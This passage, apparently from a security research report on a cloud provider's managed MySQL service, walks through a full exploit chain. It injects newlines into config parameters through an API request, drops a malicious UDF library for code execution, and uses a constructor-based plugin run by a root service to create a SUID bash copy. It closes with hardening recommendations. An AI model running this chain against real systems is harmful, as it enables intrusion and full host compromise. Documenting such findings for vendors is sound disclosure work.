 -H "Content-Type: application/json" \
 -H "Authorization: Bearer $TOKEN" \
 -d '{"config_parameters":{"default-time-zone":"+00:00\nsecure_file_priv=\nplugin_dir=/var/lib/mysql-files/\ndefault-time-zone=+00:00\n#"}}' This vector made it possible to inject line breaks and override critical configuration parameters: default-time-zone="+00:00
secure_file_priv= # removes write restrictions so files can be saved to any directory the MySQL user can access.
plugin_dir=/var/lib/mysql-files/ # sets a trusted directory for loading dynamic libraries. With the write permissions obtained, a malicious UDF library (shared object) was written to the target directory through the following SQL statement: SELECT UNHEX('$hex') INTO DUMPFILE '/var/lib/mysql-files/rce.so We restarted the MySQL database to apply the updated configuration and initialize the registered plug-in: CREATE FUNCTION sys_eval RETURNS STRING SONAME 'rce.so'; Result of executing id via MySQL UDF The list of active services was analyzed to identify opportunities for local privilege escalation to root. It turned out that the mysql-watcher.service ran with administrator privileges and periodically launched a Python script that accessed MySQL through the system client. To exploit this, we compiled another plug-in: #include <stdlib.h>
__attribute__((constructor)) static void init(void) {
 system("cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash");
} We injected the path to the directory containing the malicious library (.so file, plugin_dir parameter) and the authentication plug-in name default-auth=plugname into the [client] section of the /etc/mysql/my.cnf configuration file. The next time the background mysql-watcher.service starts the MySQL client as root, the plug-in described above executes on the server host. This causes a system command to run and creates a copy of the Bash interpreter with the SUID bit set (/tmp/rbash), which completes the chain leading to full host compromise. Conclusion The cloud provider’s infrastructure was built on in-house components rather than standard open-source solutions, which created a non-trivial attack surface. The research also identified other vulnerabilities, but they were left out of the report because they were standard. Based on the findings, the vendor was given recommendations for strengthening its security posture. The recommendations covered isolating managed services to remove network visibility between them, enforcing strict AppArmor policies to isolate service processes, and adding monitoring of how potentially vulnerable services are used.

